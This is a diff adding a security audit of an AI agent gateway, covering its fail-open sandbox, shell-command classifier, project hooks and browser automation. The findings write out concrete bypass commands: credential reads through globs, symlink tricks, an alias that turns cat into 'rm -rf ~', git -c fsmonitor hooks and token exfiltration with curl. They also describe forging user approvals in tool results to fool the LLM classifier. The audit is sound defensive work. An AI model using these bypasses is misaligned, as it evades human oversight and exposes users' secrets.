@@ -1,0 +1,167 @@
+# Security audit (2026-10-01)
+
+Status: findings only; nothing fixed. Static reading of `main@95f5920` by four read-only reviewers (daemon, node, agent runtime, web/android/infra) plus spot checks. No dynamic testing. Paths are relative to `apps/gateway/src/` unless noted.
+
+## Summary
+
+The daemon's authentication, authorization, SQL and secret handling are solid, and the web and Android clients are clean. The risk concentrates in the **agent execution layer**: auto-mode rules, `PathGuard` and the sensitive-path lists are advisory layers whose real enforcement comes from the srt sandbox — and the sandbox is fail-open, with several paths that do not need it off to escape the advisory layers.
+
+| Severity | Count |
+| -------- | ----- |
+| High     | 6     |
+| Medium   | 14    |
+| Low      | 15    |
+| Info     | 9     |
+
+## High
+
+### H1. Sandbox is fail-open
+
+`node/sandbox.ts:231-236`, `:172-179`; `node/runner.ts:173`, `:235-245`; `config.ts:338`
+
+If `srt` is missing, broken, or `sandbox.enabled: false`, the agent is spawned directly with the node account's full access; the only result is a UI warning. `PIRC_SANDBOX_SRT` defaults to `Bun.which('srt')`, so a PATH change silently removes every control (denied paths, write allowlist, network allowlist, exec approval). This was a deliberate decision (`plans/sandbox.md` decision 5) but it turns every "unsandboxed" finding below into a live one.
+
+Fix: add `sandbox.required` (default `true` on NixOS/production) that refuses to start agents when `status.active` is false; keep fail-open only as explicit opt-in.
+
+### H2. `code` (PTC) tool is never gated by auto mode
+
+`auto-mode/index.ts:117-133` (gates only `bash` and `background_task`); `ptc/code-tool.ts:83-89` (`Bun.spawn([..., 'ptc-worker', file], { env: { ...process.env, ...ctx.env } })`); `ptc/worker.ts:55` (`await import(file)` of model-written TS).
+
+Only `tools.<name>()` IPC calls go through `agent.invokeTool`. A script using `Bun.$`, `node:fs` or `node:child_process` directly runs with no PathGuard, no verdict, no write lease, no human prompt. Every `danger` rule (force-push, `rm -rf ~`, credential reads, the `just switch` block) is bypassable with `` await Bun.$`just switch` ``. Known (`plans/sandbox.md:108`), not mitigated.
+
+Fix: route the whole `code` call through `autoMode.gate` as a model-classified action, or run the worker with a preload that blocks `child_process` / `Bun.spawn` / `fs` writes outside `allowWrite`; at minimum require confirmation when the script references `spawn|exec|\$\`|node:fs|writeFile`.
+
+### H3. Opening an untrusted repository executes its `.pirc/config.json`
+
+`agent/config.ts:75-82` (project may set `hooks`, `env`, `allowedPaths`, `defaultModel`), `:163-168`, `:209`; `hooks.ts:41-47` (`/bin/sh -c hook.command`, `env: { ...process.env }`); `agent.ts:310` (`sessionStart` hooks run in `init()`).
+
+Repo-controlled code runs as the user at session start with the user's env. `env` lets a repo set `PATH`, `GIT_SSH_COMMAND`, `LD_PRELOAD` for every bash call; unsandboxed, `allowedPaths` widens writable roots to anything. No trust prompt exists (no `trust` in node/agent).
+
+Fix: require explicit per-workspace trust before honouring project `hooks` / `env` / `allowedPaths`; show them in the UI.
+
+### H4. Agent can author its own hooks via a nested `.pirc/`
+
+`agent/config.ts:151-152`, `:197-206` (only `<workspace>/.pirc` is protected); `team/team.ts:527` (child cwd = any directory); `main.ts:103`, `:108` (child workspace = `process.cwd()`).
+
+Verified by direct calls: `classifyShell('mkdir -p sub/.pirc; echo … > sub/.pirc/config.json')` → `write`; `PathGuard.resolve('sub/.pirc/config.json', 'write')` → allowed. Then `agent_spawn` / `subagent` with `cwd: 'sub'` loads `sub/.pirc/config.json` and runs its `sessionStart` hook. Hooks are never classified. Any pre-existing directory with a malicious `.pirc/config.json` works the same way; team cwd is unrestricted and unconfirmed.
+
+Fix: protect every `**/.pirc/` under the workspace (or ignore project config outside the root cwd); restrict team/subagent `cwd` to the parent's allowed roots; never load `hooks` / `env` from a project config the user has not trusted.
+
+### H5. Credential-read rule is skipped for any dynamic word
+
+`auto-mode/rules.ts:257-258` (`resolve` returns `undefined` when `word.dynamic`), `:756-760` (undefined → not checked), `:788` (`cat` → `read`).
+
+Verified: `cat ~/.ssh/*`, `cat "$HOME/.ssh/id_rsa"`, `cat ~/.ssh/id_?sa`, `command cat ~/.ssh/*`, `env -i cat ~/.ssh/*` all → `read`, while `cat ~/.ssh/id_rsa` → `danger`. srt's `denyRead` still blocks the read; unsandboxed it succeeds silently.
+
+Fix: a dynamic or globbed operand whose literal prefix is inside a secret root (or whose expansion is unknowable) must yield `unknown`, never `read`.
+
+### H6. Further auto-mode bypasses that reach `read` / `write`
+
+- **Symlink TOCTOU** — `rules.ts:267` (`realResolve` at classification time). `ln -s ~ h; cat h/.ssh/id_rsa` → `write`; `ln -s / r; cat r/etc/shadow` → `write` (link does not exist yet, so the path resolves inside the workspace). Fix: when a pipeline creates a link (`ln`, `cp -s`), mark the rest `unknown`.
+- **`PATH` / env-prefix / builtins** — `rules.ts:715-716` (leading `NAME=value` dropped unchecked), `:720-727` (`env NAME=value` dropped), `:779-786` (`export`, `set`, `shopt`, `alias` → always `read`). `export PATH=$PWD/bin:$PATH; cat README.md` → `read`; `PATH=./bin cat README.md` → `read`; `shopt -s expand_aliases\nalias cat="rm -rf ~"\ncat x` → `read`. Fix: assignments to `PATH`, `LD_PRELOAD`, `DYLD_*`, `BASH_ENV`, `ENV`, `GIT_*`, `*_PROXY`, and any `alias` / `shopt -s expand_aliases` → `unknown`.
+- **`git -c` and option-driven hooks** — `rules.ts:520` (`-c` skipped), `:541-570`. `git -c core.fsmonitor=./evil.sh status` → `read`; `git ls-remote --upload-pack=./evil.sh .` → `read`; `git -c core.sshCommand=./evil.sh fetch origin` → `write`. Fix: `-c` keys in {core.fsmonitor, core.hooksPath, core.sshCommand, core.pager, core.editor, diff.external, credential.helper, …}, `--upload-pack`, `--receive-pack`, `--exec-path` → `unknown` / `danger`.
+
+## Medium
+
+### Agent / auto mode
+
+**M1. The `just switch` block is advisory only** — `rules.ts:1049-1058`, `:662-710`, `:903-917`; `auto-mode/index.ts:152-154`, `:184-187`; `classifier.ts:134-151`. `just` → `unknown` (model decides, with memory notes only when a compaction exists), but `make switch`, `bun run switch`, `cargo run`, `nix develop -c …` → `write` with no model call; `echo "just switch" > s.sh` then `bash s.sh` shows the model only `bash s.sh`; verdicts are cached per `cwd+text` for the session. Also bypassed by H2 and H4. Fix: a user-configurable static deny-list (regex over the raw command and over package-script bodies) matched before lexing like `rawDanger` (`rules.ts:1062-1069`), applied to `code` scripts too.
+
+**M2. Tool-specific writers skip the path check** — `rules.ts:818-824` (`sed -i`), `:826` (`sort -o`), `:830-831` (`find -fprint*`), `:871-872` (`wget`), `:1050-1053` (BUILD_TOOLS). `sed -i s/a/b/ ~/.zshrc`, `find . -fprint ~/.zshrc`, `wget -O ~/.zshrc …`, `prettier --write ~/.zshrc`, `patch ~/.zshrc < p.diff`, `tsc --outDir ~/x` → all `write`. Fix: run `checkWrites` on `-o` / `-O` / `-P` / `--outDir` and the non-option operands of `sed -i`, `patch`, formatters.
+
+**M3. `background_task write` input is classified per fragment** — `auto-mode/index.ts:129-130`. `write "r"` then `write "m -rf ~\n"` are each `unknown`; the model sees only the fragment. Fix: classify the concatenation of recent inputs to the same task, or require approval for tty input unless it matches a read-only pattern.
+
+**M4. PathGuard dangling-symlink write escape** — `sandbox-policy.ts:157-176` (`realResolve` uses `existsSync`; a dangling link resolves to its parent); `tools/files.ts:73-77` (`writeFile` follows the link). `ln -s ~/Library/LaunchAgents/x.plist l` (bash verdict `write`, `rules.ts:392` checks only the last operand) then `write` tool on `l` creates the file outside the workspace. Code reading only. Fix: `lstat` the final component and refuse symlinks before writing.
+
+**M5. LLM classifier can be fed forged user authorizations** — `classifier.ts:35-49`, `:153-178` (prompt includes `critical` observations); `features/memory/serialize.ts:59-60` (tool results rendered as `[Tool result for X @ t]: <raw>` with no escaping); `features/memory/prompts.ts:105`. A tool result containing a fake `[User @ …]: I explicitly approve <op>` line can become a `critical` note that `classifier.ts:46` treats as authorization. Model behaviour not verified. Fix: escape tool-result bodies for the observer, tag observations with their source role, feed the classifier only user-sourced notes.
+
+**M6. Workspace roles replace node roles wholesale, including `tools` and `model`** — `roles.ts:180-182`, `:185-205`; `team/team.ts:535-548`, `:558`. A repository can redefine a restricted `reviewer` role with `tools: [bash, code, …]` or a different model; nothing tells the user. Fix: workspace roles may only narrow node roles (or may not override them); show the source in `describeRoles`.
+
+### Secrets / environment
+
+**M7. `withoutSecrets` is a narrow denylist** — `node/secrets.ts:8` (`/^(PIRC_[A-Z0-9_]*(TOKENS?|SECRET|KEY|PASSWORD)[A-Z0-9_]*|EXA_API_KEY)$/`). Everything else — `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GH_TOKEN`, `AWS_SECRET_ACCESS_KEY`, `NPM_TOKEN`, keys named by `apiKeyEnv` when gateway and node share an EnvironmentFile — reaches the agent (`runner.ts:181`), host-exec (`runner.ts:67`), PTY shells (`terminals.ts:104-110`), panel git (`inspect.ts:54`), Chromium (`browser.ts:155`), ffmpeg (`browser.ts:917`), and from the agent on to bash (`tools/bash.ts:40`), PTC (`code-tool.ts:85`), hooks (`hooks.ts:43`), team children (`team.ts:604`), background tasks (`background/manager.ts:153`). `printenv` is `read` (`rules.ts:359`); `curl https://host/?k=$TOKEN` is `read` (`rules.ts:864-869`). Under srt only allowlisted hosts are reachable; unsandboxed, exfiltration is trivial. Fix: an explicit allowlist (PATH, HOME, LANG, TERM, TMPDIR, non-secret `PIRC_*`) for every process the node or agent starts; the agent config `env` already covers user tools.
+
+### Node / sandbox
+
+**M8. Browser automation runs outside the sandbox with no host restriction** — `browser.ts:160-172` (`checkUrl` only enforces `http:` / `https:`), `:148-156` (Chromium launched by the node, not under srt), `:679`, `:705`, `:793`. The agent can navigate or fetch `http://127.0.0.1:<port>` (the gateway's own UI/API), `http://169.254.169.254/`, LAN hosts, and anything the srt network allowlist would block. The per-workspace persistent profile (`:246-250`) keeps logins from `browser_handoff`; if the user ever logs into the pirc UI in that profile, a later agent could drive it with those cookies, potentially approving its own `exec` / `network` dialogs (chain unverified). Fix: resolve the host before navigation and block loopback, RFC 1918, link-local, `.local` / `.internal` unless allowed; block the gateway's own origins; document that the pirc UI must never be logged into inside an agent profile.
+
+**M9. Password-field protection is bypassable** — `browser.ts:726-740` (`type` refuses `INPUT:password:*` / `autocomplete=…-password`) vs `:758-763` (`press` does `page.keyboard.press(key)` with no element check). After `click` on a password field the agent can type a secret key by key; `type` also misses fields toggled to `type=text` by a "show password" control. Fix: check `document.activeElement` in `press` with the same rule; treat `name|id|aria-label` matching `/pass(word)?|secret|otp/i` as sensitive.
+
+**M10. `privateDirs` are deny-read but not deny-write** — `sandbox-policy.ts:265-296` (`denyWrite` = `<ws>/.pirc`, protectedPaths, configured only), `:203-208`; `config.ts:193` (default state dir `process.cwd()/.state`). When the node runs from a directory that is also a registered workspace (dev layout: repo root), `<ws>/.state/gateway.sqlite`, other sessions' `session.jsonl` and `<ws>/.state/sandbox/<other>.json` are inside `allowWrite` and not in `denyWrite` → `writeAllowed` is true (reads stay denied). `test/sandbox-policy.test.ts:19-28` only covers state outside the workspace. Whether srt independently blocks the write is unverified; the agent's own PathGuard (`agent/sandbox.ts:63`) uses this exact function. Fix: add `privateDirs` and `SENSITIVE_HOME_PATHS` to `denyWrite`, re-allow only `sessionDir` / `memoryDir`; refuse to register a workspace that contains or equals `stateDir`.
+
+**M11. Linux: all Unix sockets reachable from the sandbox** — `node/sandbox.ts:84-86` (`allowAllUnixSockets: true`; acknowledged in `plans/sandbox.md:89`). `/var/run/docker.sock`, ssh-agent, systemd/DBus sockets reachable by the node account are open to the agent; if the node account is in `docker`, this is a full host escape. Fix: bind-mount the inference socket to a dedicated path and tighten; at minimum deny common escape sockets on Linux and document the docker-group risk.
+
+**M12. Team and subagent `cwd` is unrestricted and unconfirmed** — `team/team.ts:527-529` (`resolve(defaults.cwd, args.cwd)` + "must be a directory"); `main.ts:103`, `:108`. Unsandboxed, a child in another repo gets write access there (`agent/config.ts:179`) plus that repo's `.pirc` hooks / env / roles (H3, H4). Under srt the inherited `PIRC_SANDBOX_POLICY` keeps the node's write set. Fix: require `cwd` inside the parent's `allowedRoots`, or confirm with the user.
+
+### Daemon
+
+**M13. Browser→node relay has no size check; a large frame drops the whole node link** — `daemon/app.ts:148` (`maxPayload: NODE_FRAME_MAX_BYTES` = 16 MiB applies to browser sockets too), `:916-924`, `:973-981` (`JSON.parse(raw); stream.send(message)` with no cap); `daemon/nodes.ts:212-216`, `:263-266` (no length or `bufferedAmount` check); `node/runtime.ts:267` (node rejects > 16 MiB with close 1009). Any authenticated user with a session on a node can send a ~16 MiB terminal frame; `onDisconnect` then interrupts every session on that node, clears leases and fails runs (`app.ts:387-395`). Fix: cap relayed messages (e.g. 64 KiB) before `stream.send`, use a small `maxPayload` on browser-facing routes, and check `Buffer.byteLength` + `socket.bufferedAmount` in `NodeRegistry.send` as `startInference` already does (`nodes.ts:489-493`).
+
+**M14. Trusted-proxy check is source-IP only** — `daemon/auth.ts:30-32`, `:61-65`; `config.ts:230-234`, `:285-294`. With `PIRC_TRUSTED_PROXIES=127.0.0.1` (co-located proxy, explicitly supported), any process on the gateway host can connect to the gateway port, set `Host` + `x-pirc-user: <allowed user>` and act as that user. Fix: additionally require a proxy shared-secret header (`timingSafeEqual`), or a Unix socket / mTLS between proxy and gateway; document that nodes must not share the gateway host unless agents are network-sandboxed.
+
+## Low
+
+- **L1. Read deny-lists are inconsistent and incomplete** — `sandbox-policy.ts:62-90` vs `auto-mode/rules.ts:224-239`; `node/sandbox.ts:205-213`. File tools allow `~/.npmrc` while rules call it a secret; rules allow `cat ~/Library/Keychains/…` and `~/.config/sops/…` as `read` while file tools deny them. Not denied anywhere: `~/.config/.pirc` (`defaultConfigDir`, `models.ts:15`, whose `models.json` may hold literal `apiKey` values, `models.ts:67`, `:116`), `$PIRC_CONFIG_DIR/config.json` (may hold `env` secrets), `~/.npmrc`, `~/.yarnrc.yml`, `~/.cargo/credentials.toml`, `~/.gem/credentials`, `~/.bundle/config`, `~/.terraform.d/credentials*`, `~/.claude`, `~/.codex`, `~/.config/op`, `~/.docker` (only `config.json`), Edge profiles, shell histories, `~/.local/pirc-node/agent.env`, `/proc/self/environ`. Fix: one shared list.
+- **L2. `.git/hooks` and `.git/config` are ordinary workspace writes for the agent** — `echo hi > .git/hooks/pre-commit; chmod +x …; git commit` → `write`; `git config core.hooksPath ./hooks` → `write`; PathGuard allows writes under `.git/`. srt makes these read-only (`sandbox-policy.ts:138-139`); unsandboxed it is code execution on the next commit. Fix: add them to the agent's `protectedPaths`.
+- **L3. Build caches are writable** — `sandbox-policy.ts:93-102`, `:286`. `~/.cargo/registry`, `~/.cargo/git`, `go/pkg/mod`, `~/.gradle/caches`, `~/.cache`, `~/.npm`: a sandboxed agent can plant code that runs when the user builds outside the sandbox. Inherent trade-off; document or make opt-in.
+- **L4. Credential directories can be registered as a workspace** — `node/app.ts:243` only checks `canonical.startsWith(home + sep)`; `sandbox-policy.ts:200` allow-wins-tie makes `~/.ssh`, `~/.aws`, the state dir readable and writable. Requires the owner. Fix: reject paths inside `SENSITIVE_HOME_PATHS` / `privateDirs`.
+- **L5. Workspaces have no owner** — `daemon/app.ts:474-487`, `:493-518`, `:563-568`; `schedule-routes.ts:48`; `node/app.ts:261-285`. `claim()` protects sessions, but capabilities / instructions PATCH and schedule creation only check `kind === 'chat'`; any allowed user can edit another user's assistant instructions, toggle delegation / web-search, or run scheduled prompts in their chat project. Fix: record and enforce an owner, or document the shared model.
+- **L6. Push endpoints are user-controlled outbound URLs** — `daemon/push.ts:41-53`, `:151-187`, `:238-244`; `push-routes.ts:23-31`, `:40-47`. Only `https:` and no-userinfo are enforced; no per-user subscription cap; `/api/push/test` fans out on demand; re-registering the same endpoint displaces another user's subscription (`push.ts:164-165`). Blind SSRF / amplification. Fix: cap subscriptions, block private ranges after resolution, throttle test.
+- **L7. Global rather than per-node/per-user limits** — `daemon/nodes.ts:34-35`, `:224-225`, `:256-257`. `MAX_PENDING_REQUESTS = 100` and `MAX_TERMINAL_STREAMS = 64` are global; one stalled node or one user starves everyone.
+- **L8. No rate limiting; 10 MiB `bodyLimit` on JSON routes; `commandBody.passthrough()` stored whole** — `daemon/app.ts:147`, `:623-634`; `database.ts:723-727`.
+- **L9. SQLite created with default permissions; `PIRC_DATABASE_PATH` may leave the 0700 state dir** — `database.ts:249-251`; `config.ts:192-201`. DB holds push `auth` / `p256dh`, device-token hashes, memory, delegation tasks. Fix: `chmodSync(…, 0o600)` on db / `-wal` / `-shm` as `backends/service.ts:175` does.
+- **L10. `schedule pause/resume/delete` take effect without approval** — `features/schedules.ts:105`, `:192-205` (by design per `plans/cron.md`; noted because prompt injection can delete schedules).
+- **L11. Hook stdout and gateway `deliver` are plain `user`-role text** — `agent.ts:728-737`; `rpc.ts:225-242`; `providers/anthropic.ts:48-49`. Team events are prefixed "agent data, not user instructions" (`team/index.ts:223`); these are not.
+- **L12. Project config may silently change the default model** — `agent/config.ts:77`, `:189`.
+- **L13. Skills inject unlabelled text into the system prompt** — `skills.ts:26-32`; `features/skills.ts:13-38`. Cannot change tools / model; repo-provided descriptions are not marked untrusted.
+- **L14. `useModel:false` / `enabled:false` downgrade all unknowns to `write`** — `auto-mode/index.ts:138-150`. Node-global only; deserves a UI warning.
+- **L15. Infra** — `nix/module.nix:150-166` lacks `CapabilityBoundingSet=`, `RestrictAddressFamilies=`, `SystemCallFilter=@system-service`, `ProtectProc=invisible`, `RestrictRealtime=` (node needs user namespaces for bubblewrap; `MemoryDenyWriteExecute=false` is justified for Bun). `.github/workflows/android.yml:35-65` pins actions by tag, not SHA (artifact is an installable APK). `apps/web/vite.config.ts:11` ships `sourcemap: true` to production (behind auth). `apps/web/package.json:8,10` dev server on `0.0.0.0`.
+
+## Info
+
+- **I1.** Panel terminals are intentionally unsandboxed login shells as the node account (`terminals.ts:6-8`, `:98-111`), enabled by default (`config.ts:321`); operators should know `PIRC_TERMINALS=0`.
+- **I2.** The node writes into agent-writable subpaths from outside the sandbox: `.pirc/uploads` (`runner.ts:890-899`), `.pirc/recordings` (`browser.ts:881-885`), `panel-routes.ts:425`. `<ws>/.pirc` is `denyWrite`, so only relevant when the sandbox is off (symlinked dir → `copyFileSync` / ffmpeg `-y` writes outside the workspace; unverified).
+- **I3.** A trusted node can inflate gateway state without caps (`activity.sessions` ≤ 10 000, `memory_mirror` ≤ 10 000 × 2 000 × 20 000 chars, 16 MiB events buffered 1 000 per session) — `daemon/nodes.ts:83-103`; `memory-records.ts:101-125`; `app.ts:360-378`.
+- **I4.** Delegation errors enumerate all directory workspaces to any chat agent — `daemon/delegations.ts:139-143`.
+- **I5.** OAuth worker inherits the full gateway env including `PIRC_NODE_TOKENS`, `EXA_API_KEY`, `PIRC_VAPID_PRIVATE_KEY` — `backends/oauth-worker.ts:38-43`.
+- **I6.** Mermaid SVG is inserted via `innerHTML` after `mermaid.render` with `securityLevel: 'strict'`, bypassing the app's DOMPurify pass — `apps/web/src/lib/markdown.ts:366`, `:424`. Consider `DOMPurify.sanitize(svg, { USE_PROFILES: { svg: true, svgFilters: true } })`.
+- **I7.** `result` is ignored only via `.git/info/exclude`, not `.gitignore`.
+- **I8.** Tracked examples use node IDs `homolab` / `m5pro` / `mac` (`apps/gateway/.env.example:24,40`; `nix/example.nix:6`; `docs/deploy/nixos.md:12`; `docs/deploy/macos-node.md:41-42`; `nix/README.md:79`; `apps/web/src/lib/mock.ts:36,44,66`). Confirm they are placeholders; the tracked-docs rule is placeholders only.
+- **I9.** `baseUrl` for providers accepts `http://` (`models.ts:59`); TLS is not enforced. Gateway config only.
+
+## Checked and found sound
+
+- **Auth**: trusted-proxy IP → Host allowlist → Origin (required on non-GET and whenever present) → forward-auth header or device bearer; a request carrying both is refused (`daemon/auth.ts`). Global `onRequest` hook; the only exemption is `/node/connect` with `Upgrade: websocket`, which validates its own token (`app.ts:443-461`). Every WS handler re-runs `validateRequest(…, requireOrigin=true)` (`app.ts:803`, `:892`, `:947`) — CSWSH-safe.
+- **Tokens**: device tokens are 32 random bytes stored as SHA-256 with idle/max-age expiry (`devices.ts:19`, `:121`, `:160`); node tokens are length-checked `timingSafeEqual`, ≥ 32 chars, unique (`nodes.ts:138-148`; `config.ts:222-229`); `DEVICE_DENIED` is checked on both route pattern and raw path.
+- **Isolation**: every session route goes through `claim()` → `ownerUser === user` (`database.ts:552-557`); node→gateway `event` / `activity` / `response` / `terminal_frame` / `agent_request` are scoped by `nodeId`; memory search / recall / delegation / schedule reads are `owner_user`-scoped; agent ops are an `Object.hasOwn` allowlist with zod per op and capability gates (`agent-ops.ts:436-453`).
+- **Approvals**: delegation and schedule answers only via the interaction route requiring owner + lease (`app.ts:711-735`), re-validated server-side (`delegations.ts:423-452`; `schedules.ts:692-703`). Node sandbox dialogs use a `node-sandbox-` prefix the agent cannot answer (`node/runner.ts:280-286`); the agent only emits `sandbox_request` and matches replies by random UUID (`sandbox-channel.ts:48-65`). Team children: UI dialogs auto-cancelled (`team.ts:198-205`), cannot pick model / thinking (`:531-534`), cannot reply to questions addressed to `user` (`:1208`), `origin: 'human'` is set server-side (`:949-958`); headless children refuse `danger` (`auto-mode/index.ts:219-220`).
+- **SQL**: all values parameterized; dynamic fragments are compile-time literals; `LIKE` escaped with `ESCAPE '\'` (`memory-records.ts:69`, `:221`).
+- **Secrets**: `publicModels` strips `apiKey` / `headers` / `baseUrl` before anything reaches nodes or browsers (`models.ts:173-205`); backend settings and VAPID keys 0600 in 0700 dirs; inference socket 0600 with a random 32-byte bearer and `timingSafeEqual` (`node/inference.ts:33-39`, `:91-94`); `text()` redacts token-like strings; 500s are generic. The agent is spawned with `withoutSecrets(process.env)` (`runner.ts:181`), so `PIRC_*` tokens never reach it.
+- **Node surface**: the node never listens on TCP; requests arrive via `app.inject` over its outbound WS (`node/app.ts:1-5`; `runtime.ts:191-209`), every request requires `NODE_USER_HEADER` ∈ `allowedUsers`, every session route goes through `claimSession(owner)`; `ws://` only for loopback (`config.ts:283-288`).
+- **Paths**: panel file access uses `resolveInside` (realpath on root and target, rejects `..` / absolute escapes, `inspect.ts:105-131`); recording paths are regex-constrained (`panel-routes.ts:97`, `:351`); upload names are `basename`d; git runs fixed argv arrays via `Bun.spawn` with `:(literal)` pathspecs after `--`, `--no-ext-diff --no-textconv`, `core.fsmonitor=false`, `GIT_TERMINAL_PROMPT=0`, timeouts and output caps (`inspect.ts:33-94`). PathGuard refuses `../x`, `~/.zshrc`, `/tmp/x`, `.pirc/config.json`, `~/.ssh/../.ssh/id_rsa`; `write` / `edit` acquire the write lease first.
+- **Rules that work**: `rm -rf /`, `rm -rf ~`, `git push --force`, `reset --hard`, `curl|sh`, `>/dev/tcp/…`, `2>` outside, `tee ~/.zshrc`, `cp/mv/rsync/zip/scp/tar` touching `~/.ssh`, `cd ~/.ssh`, `kill -1`, `echo x > .pirc/config.json`, heredocs / `$()` / backticks / process substitution → `unknown`. Web and search results are labelled untrusted.
+- **Session store**: dirs 0o700, JSONL / uploads / settings 0o600; transcript parsing never evals content. Memory writes bounded (10 000 chars) with best-effort redaction.
+- **Web**: every `{@html}` is DOMPurify-sanitized with a narrow `ADD_ATTR`; no tokens in localStorage; fetches use `credentials: 'include'`; WS URLs derive from `location`; the service worker caches only hashed assets and the app shell, never `/api/`; push payloads rendered via the Notification API.
+- **Android**: `allowBackup=false`, extraction rules exclude everything, only `MainActivity` exported; release NSC forbids cleartext; token stored AES-GCM via AndroidKeyStore; `pirc://pair` strictly parsed and staged for user confirmation; WebView loads only bundled assets with file/content access off and a minimal JS interface.
+- **Infra**: gateway and node run as separate system users, state 0700, node token via `LoadCredential` with umask 077; nginx puts `/api/` and `/` behind `auth_request` and always overwrites the identity header; device-token bypass and `/node/connect` are opt-in. `.gitignore` covers `.env*`, `state/`, `data/`, `*.sqlite*`, `DEPLOY.md`, `.pirc/`, `dist/`, keystores. No secrets, real FQDNs, emails or non-local IPs in tracked files; no `dist` / `result` / `build` tracked. Dependency pins (fastify 5.12.5, @fastify/websocket 11.3.1, ws 8.21.3, web-push 3.6.7, playwright-core 1.63.0, zod 3.25.76, vite 7.1.7, svelte 5.57.1, marked 16.4.2, dompurify 3.4.16, mermaid 11.17.2) are current; not checked against a live advisory database.
+
+## Not verified
+
+- Actual srt Seatbelt / bubblewrap behaviour: whether `denyRead` also blocks writes, `allowGitConfig` enforcement, whether M10 is independently blocked.
+- Model behaviour for M5 (forged `[User @ …]` lines) and the end-to-end cookie chain in M8.
+- Live bash behaviour of the alias / `PATH` tricks in H6 (verdicts were produced by calling `classifyShell` / `PathGuard` directly).
+- Whether the deployed reverse proxy strips `x-pirc-user`, `Origin` and `Host` from clients.
+- Dependency CVE status against a current advisory database.
+- Whether the web UI renders the full `exec` command text (up to 20 000 chars, `runner.ts:663`) in the confirm dialog.
+- `compaction.ts`, `title.ts`, `goal/`, `todo/`, `EventHub` internals were skimmed only.
+
+## Suggested order
+
+1. **H1** `sandbox.required` — downgrades every "unsandboxed" finding (H2–H6, M4, M10, L2, I2) to defence-in-depth.
+2. **H2 + H3 + H4 + M12** — gate `code` through auto mode; per-workspace trust for project `hooks` / `env` / `allowedPaths`; protect `**/.pirc/`; restrict team `cwd`.
+3. **M7** — allowlisted env for every spawned process.
+4. **H5 + H6 + M1 + M2 + M3** — `rules.ts`: dynamic words in secret roots → `unknown`; `ln` taints the pipeline; `PATH` / alias / `git -c` → `unknown`; write checks on tool-specific output flags; static user deny-list before lexing; concatenate tty fragments.
+5. **M8 + M9** — browser host blocking and `press` guard.
+6. **M13 + M14** — relay size cap; proxy shared secret.
+7. **M6 + M10 + M11 + L1 + L2 + L9** — role override semantics; `denyWrite` for private dirs; Unix sockets on Linux; unified deny-list; `.git` protection; sqlite mode.
+8. Remaining Low / Info as hygiene.
